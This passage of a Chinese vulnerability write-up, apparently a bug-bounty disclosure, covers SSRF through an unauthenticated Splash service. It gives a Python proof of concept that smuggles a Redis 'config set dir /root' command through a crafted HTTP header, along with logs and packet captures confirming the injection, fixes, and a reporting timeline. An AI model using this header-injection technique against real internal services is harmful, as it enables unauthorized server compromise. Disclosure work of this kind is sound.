<p>这里测试选择了 redis 3.2.8 版本，以 root 权限运行，监听在 172.16.10.74，测试脚本如下，可以成功执行</p>
<div class="codehilite"><pre><span></span><span class="c1"># -*- coding: utf-8 -*-</span>
<span class="n">__author__</span> <span class="o">=</span> <span class="s1">&#39;b1ng&#39;</span>

<span class="kn">import</span> <span class="nn">requests</span>

<span class="k">def</span> <span class="nf">test_get</span><span class="p">(</span><span class="n">api</span><span class="p">,</span> <span class="n">redis_api</span><span class="p">):</span>
    <span class="n">url</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">%s</span><span class="s2">/render.html&quot;</span> <span class="o">%</span> <span class="n">api</span>

    <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">redis_api</span><span class="p">,</span>
        <span class="s1">&#39;timeout&#39;</span><span class="p">:</span> <span class="mi">10</span>
    <span class="p">}</span>
    <span class="n">resp</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span>
        <span class="s1">&#39;headers&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s1">&#39;config set dir /root</span><span class="se">\n</span><span class="s1">&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
        <span class="p">},</span>
    <span class="p">})</span>

    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">request</span><span class="o">.</span><span class="n">url</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">status_code</span><span class="p">)</span>
    <span class="k">print</span><span class="p">(</span><span class="n">resp</span><span class="o">.</span><span class="n">text</span><span class="p">)</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="c1"># splash地址和端口</span>
    <span class="n">splash_host</span> <span class="o">=</span> <span class="s1">&#39;192.168.1.120&#39;</span>
    <span class="n">splash_port</span> <span class="o">=</span> <span class="mi">8050</span>

    <span class="c1"># 内网docker的地址和端口</span>
    <span class="n">docker_host</span> <span class="o">=</span> <span class="s1">&#39;172.16.10.74&#39;</span>
    <span class="n">docker_port</span> <span class="o">=</span> <span class="mi">6379</span>

    <span class="n">splash_api</span> <span class="o">=</span> <span class="s2">&quot;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">splash_host</span><span class="p">,</span> <span class="n">splash_port</span><span class="p">)</span>
    <span class="n">docker_api</span> <span class="o">=</span> <span class="s1">&#39;http://</span><span class="si">%s</span><span class="s1">:</span><span class="si">%d</span><span class="s1">&#39;</span> <span class="o">%</span> <span class="p">(</span><span class="n">docker_host</span><span class="p">,</span> <span class="n">docker_port</span><span class="p">)</span>

    <span class="n">test_get</span><span class="p">(</span><span class="n">splash_api</span><span class="p">,</span> <span class="n">docker_api</span><span class="p">)</span>
</pre></div>


<p>运行后 redis 发出了警告 (高版本的新功能)</p>
<div class="codehilite"><pre><span></span><span class="mi">24089</span><span class="o">:</span><span class="n">M</span> <span class="mi">11</span> <span class="n">Jul</span> <span class="mi">23</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="mf">07.730</span> <span class="o">-</span> <span class="n">Accepted</span> <span class="mf">172.17</span><span class="o">.</span><span class="mf">0.2</span><span class="o">:</span><span class="mi">56886</span>
<span class="mi">24089</span><span class="o">:</span><span class="n">M</span> <span class="mi">11</span> <span class="n">Jul</span> <span class="mi">23</span><span class="o">:</span><span class="mi">29</span><span class="o">:</span><span class="mf">07.730</span> <span class="err">#</span> <span class="n">Possible</span> <span class="n">SECURITY</span> <span class="n">ATTACK</span> <span class="n">detected</span><span class="o">.</span> <span class="n">It</span> <span class="n">looks</span> <span class="n">like</span> <span class="n">somebody</span> <span class="k">is</span> <span class="n">sending</span> <span class="n">POST</span> <span class="n">or</span> <span class="n">Host</span><span class="o">:</span> <span class="n">commands</span> <span class="n">to</span> <span class="n">Redis</span><span class="o">.</span> <span class="n">This</span> <span class="k">is</span> <span class="n">likely</span> <span class="n">due</span> <span class="n">to</span> <span class="n">an</span> <span class="n">attacker</span> <span class="n">attempting</span> <span class="n">to</span> <span class="n">use</span> <span class="n">Cross</span> <span class="n">Protocol</span> <span class="n">Scripting</span> <span class="n">to</span> <span class="n">compromise</span> <span class="n">your</span> <span class="n">Redis</span> <span class="n">instance</span><span class="o">.</span> <span class="n">Connection</span> <span class="n">aborted</span><span class="o">.</span>
</pre></div>


<p>但是执行了</p>
<div class="codehilite"><pre><span></span>172.16.10.74:6379&gt; config get dir
1) &quot;dir&quot;
2) &quot;/root&quot;
</pre></div>


<p>后来又测试了一下 post body，发现 body 还没发出去，连接就被强制断开了，所以无法利用</p>
<p>这里用 nc 来看一下发送的数据包</p>
<div class="codehilite"><pre><span></span><span class="nt">root</span><span class="p">@</span><span class="k">test</span><span class="o">:/</span><span class="nt">home</span><span class="o">/</span><span class="nt">user</span><span class="o">/</span><span class="nt">Desktop</span><span class="err">#</span> <span class="nt">nc</span> <span class="nt">-vv</span> <span class="nt">-l</span> <span class="nt">-p</span> <span class="nt">5555</span>
<span class="nt">Listening</span> <span class="nt">on</span> <span class="cp">[</span><span class="mf">0.0.0.0</span><span class="cp">]</span> <span class="o">(</span><span class="nt">family</span> <span class="nt">0</span><span class="o">,</span> <span class="nt">port</span> <span class="nt">5555</span><span class="o">)</span>
<span class="nt">Connection</span> <span class="nt">from</span> <span class="cp">[</span><span class="mf">172.17.0.2</span><span class="cp">]</span> <span class="nt">port</span> <span class="nt">5555</span> <span class="cp">[</span><span class="nx">tcp</span><span class="cm">/*] accepted (family 2, sport 38384)</span>
<span class="cm">GET / HTTP/1.1</span>
<span class="cm">config set dir /root</span>
<span class="cm">:</span>
<span class="cm">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/</span><span class="o">*</span><span class="p">;</span><span class="n">q</span><span class="o">=</span><span class="mf">0.8</span>
<span class="nx">User</span><span class="na">-Agent</span><span class="p">:</span> <span class="nx">Mozilla</span><span class="p">/</span><span class="nx">5.0</span> <span class="p">(</span><span class="nx">X11</span><span class="p">;</span> <span class="nx">Linux</span> <span class="nx">x86_64</span><span class="p">)</span> <span class="nx">AppleWebKit</span><span class="p">/</span><span class="nx">538.1</span> <span class="p">(</span><span class="nx">KHTML</span><span class="p">,</span> <span class="nx">like</span> <span class="nx">Gecko</span><span class="p">)</span> <span class="nx">splash</span> <span class="nx">Safari</span><span class="p">/</span><span class="nx">538.1</span>
<span class="nx">Connection</span><span class="p">:</span> <span class="nx">Keep</span><span class="na">-Alive</span>
<span class="nx">Accept</span><span class="na">-Encoding</span><span class="p">:</span> <span class="nx">gzip</span><span class="p">,</span> <span class="nx">deflate</span>
<span class="nx">Accept</span><span class="na">-Language</span><span class="p">:</span> <span class="nx">en</span><span class="p">,</span><span class="o">*</span>
<span class="nx">Host</span><span class="p">:</span> <span class="mf">172.16.10.74</span><span class="p">:</span><span class="mi">5555</span>
</pre></div>


<p>可以看到  <code>config set dir /root</code>，说明可以利用</p>
<p>其他的话，因为支持post，也可以结合一些内网系统进行利用，这里就不细说了</p>
<h4>0x04 修复方案</h4>
<p>对于 splash，看了下文档，没有提到认证说明，应该是应用本身就没有这个功能，所以得自己加认证，临时方案可以用 basic 认证，彻底修复的话还是得自己修改代码，加上认证功能</p>
<p>这里的 docker remote api，应该是因为旧版本的 swarm 开放的，根据 文档 中 step 3，每个 node 都会开放 2375 或者 2376 端口，通过 iptables 来限制的话，需要配置 client node 的端口只允许 manager 访问，manager 的端口需要加白名单</p>
<h4>0x05 Timeline</h4>
<ul>
<li>
<p>2017-07-05 02:00:00  提交漏洞，报告内容为存在带回显 SSRF</p>
</li>
<li>
<p>2017-07-05 10:07:28  深入后成功获取内网服务器root权限 (可获取多台服务器root权限，并可拉取和push docker仓库image，仓库中有如 api-xxx、xxx.com 名称的 image )，联系审核人员，提交补充后的报告</p>
</li>
<li>
<p>2017-07-06 18:15:00  联系审核人员，询问进度，告知已复现。因为之前相同危害漏洞评级为严重，所以询问此漏洞是否属于严重漏洞，告知金币兑换比例提升后( 5:1 提升为 1:1 )，严重漏洞评定收紧，明天审核</p>
</li>
<li>
<p>2017-07-07 14:31:00  审核人员告知复现时，获取内网权限步骤遇到问题，要求提供更多细节，因为之前笔记笔记乱，回复晚些整理后再发送，顺带询问评级，答复获取到权限的服务器不属于核心服务器，并且内部对评为 一般业务高危 还是 一般业务严重 存在分歧，对应金币奖励为 800 和 1000，正好赶上三倍活动，也就是 2400 - 3000。这里算了一下，按照奖励提升之前的评级规则，相同危害的漏洞是评为核心严重的，对应奖励为 5000现金 + 3000 积分 (兑换比例5:1)，这里相同危害，奖励提升后，再加上三倍金币活动，比之前的奖励还低一些，所以觉得不合理，因赶上周五和其他一些事情，商量下周一给评级</p>
</li>
<li>
<p>2017-07-10 10:16:00 联系审核人员，因为两边对于评级意见不一致，询问是否能够给予授权，继续深入，尝试证明可获取到 “核心服务器” 权限，回复没有给予授权，并告知可以判定为非核心严重级别，询问是否能够接受，回复不能接受，并给出理由</p>
</li>
<li>
<p>2017-07-12 10:08:00 联系审核人员，提供获取反弹 shell  EXP，并告知会写文章，希望尽快确认并修复，最终给予评级 严重非核心 ，1500 积分，4500 金币(三倍活动)</p>
</li>
</ul>
      
<hr>
<p><img src="https://images.seebug.org/content/images/2017/08/0e69b04c-e31f-4884-8091-24ec334fbd7e.jpeg" alt="Paper" style="width: 220px">
本文由 Seebug Paper 发布，如需转载请注明来源。本文地址：<a href="https://paper.seebug.org/354/">https://paper.seebug.org/354/</a></p>
            
    </section>

  <nav class="pagination" role="navigation" style="padding: 3rem;">
    
      <a class="newer-posts" href="/353/"><span aria-hidden="true">&larr;</span> Nginx 整数溢出(CVE-2017-7529)漏洞分析</a>
    
    
      <a class="older-posts" href="/355/">CVE-2017-8543 Windows Searc... <span aria-hidden="true">&rarr;</span></a>
    
  </nav>


    

      
        <footer class="post-footer">
          <figure class="author-image">
            <a class="img" href="/users/author/?nickname=b1ngzz"
               style="background-image: url(https://images.seebug.org/uploads/2017/08/avatar.png)"><span
                class="hidden">'s Picture</span></a>
          </figure>

          <section class="author">
            <h4><a
                href="/users/author/?nickname=b1ngzz">b1ngzz</a>
            </h4>
            <p>阅读更多有关<a
                href="/users/author/?nickname=b1ngzz">该作者</a>的文章
            </p>
            
            <div class="author-meta">
            </div>
          </section>

          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          
          

        </footer>
      
    
    <br>
    <section class="plugin_comment">
    </section>

  </article>
  <section class="plugin_feedback"></section>


  </div>
</main>
</div>

<script type="text/javascript" src="/static/js/jquery.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.fitvids.js"></script>
<script type="text/javascript" src="/static/js/index.js"></script>
<script type="text/javascript" src="/static/js/prism-loader.js"></script>
<script type="text/javascript" src="/static/js/prism.js"></script>
<script type="text/javascript" src="/static/js/jquery.ghostHunter.js"></script>
<script type="text/javascript" src="/static/js/js.cookie.js"></script>
<script type="text/javascript" src="/static/js/custom.js?t=20170821"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/comment_main.js"></script>
<script type="text/javascript" src="https://www.seebug.org/static/dist2/scripts/plugin_feedback.js"></script>
</body>

</html>
